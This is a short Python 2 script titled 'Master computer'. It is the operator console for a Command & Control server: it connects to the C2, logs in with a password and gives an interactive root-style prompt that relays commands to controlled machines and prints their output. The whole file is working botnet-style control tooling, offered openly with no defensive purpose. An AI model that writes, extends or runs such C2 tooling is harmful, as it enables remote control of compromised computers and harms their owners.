# Date: 08/13/15
# Author: Ethical-H4CK3R
# Description: Master computer
#

import socket

class Master(object):
 ''' Commander in Chief '''

 def __init__(self,ip=None,port=None):
  self.serverIp = ip if ip else '127.0.0.1'
  self.serverPort = port if port else 12345
  self.master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  try:
   self.master.connect((self.serverIp, self.serverPort))
  except:
   exit('Failed to contact Command & Control server')

 def exit(self):
  try:
   self.master.shutdown(socket.SHUT_RDWR)
   self.master.close()
  finally:
   exit()

 def cmd(self):
  while 1:
   try:
    self.master.sendall(' ') # see if we have a connection
    cmd = raw_input('root@{}:~# '.format(self.serverIp))
    if cmd:
     self.master.sendall(cmd)
     self.master.settimeout(0.1)
     print self.master.recv(1024) # wait for response from server
   except socket.timeout:pass
   except:self.exit()

 def login(self):
  try:
   self.master.sendall('master')
   print self.master.recv(1024) # server is going to ask for password

   password = raw_input('\n$>> ')
   self.master.sendall(password)
   response = self.master.recv(1024)

   if response == 'access granted':
    self.cmd()
   else:
    print response
  except:self.exit()

 def run(self):
  self.login()

Master().run()
